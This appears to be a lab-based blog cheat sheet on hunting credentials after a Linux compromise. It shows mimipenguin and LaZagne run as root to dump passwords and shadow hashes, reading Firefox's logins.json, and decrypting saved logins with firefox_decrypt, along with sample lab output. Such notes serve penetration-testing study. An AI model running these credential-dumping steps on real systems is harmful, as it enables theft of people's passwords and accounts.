---
title: Linux-Memory-Cache-Browser-Credentials-Hunting
date: 2025-11-27 14:34:52

categories:
  - Active Directory
  - Linux
  - Post Exploitation
  - Credential Hunting

tags:
  - browser-credentials
  - LaZagne
  - Mimipenguin

cover: /img/zoom.png
top_img: /img/bg-img.jpg
description: Hunt for credentials on memory, caches and Browser folder.
---


## Mimipenguin ( root access is required )


➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.

```bash
sudo python3 mimipenguin.py

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
```

## LaZagne ( Root recommended, but not always required )


```bash
sudo python2.7 laZagne.py all


------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```


LaZagne without root

- `browser passwords (if user profile is readable)`
- `Git credentials`
- `SSH keys`
- `environment variables`
- `configuration files`


## Browser redentials

### Firefox

#### Enumeration

By default, Firefox stores saved credentials in an encrypted file named `logins.json`.

```shell-session
ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```


```bash
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```
#### Decrypt

To decrypt saved credentials we can use [firefox_decrypt](https://github.com/unode/firefox_decrypt)


```bash
python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```